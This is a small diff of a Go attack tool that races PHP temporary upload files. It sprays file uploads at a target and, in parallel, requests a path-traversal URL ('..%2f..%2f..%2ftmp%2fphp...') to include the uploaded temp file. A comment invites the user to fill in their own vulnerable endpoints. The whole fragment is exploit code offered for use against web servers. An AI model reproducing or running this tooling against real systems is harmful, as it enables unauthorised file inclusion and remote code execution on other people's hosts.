@@ -125,8 +125,8 @@ func main() {
 	copies := flag.Int("copies", 20, "file copies per post")
 	target := flag.String("target", "127.0.0.1:1337", "target host:port")
 	flag.Parse()
-	SprayTargetURL := fmt.Sprintf("http://%s/", *target)
-	PrayTargetURL := fmt.Sprintf("http://%s/index.php/..%%%%2f..%%%%2f..%%%%2ftmp%%%%2fphp%%s", *target)
+	SprayTargetURL := fmt.Sprintf("http://%s/index.php", *target)
+	PrayTargetURL := fmt.Sprintf("http://%s/index.php/..%%%%2f..%%%%2f..%%%%2ftmp%%%%2fphp%%s", *target) // N.B. fill in your own vulnerable end-points here
 	runtime.GOMAXPROCS(*sprayers + *prayers + 1)
 	done := make(chan bool)
 	for i := 0; i < *sprayers; i++ {
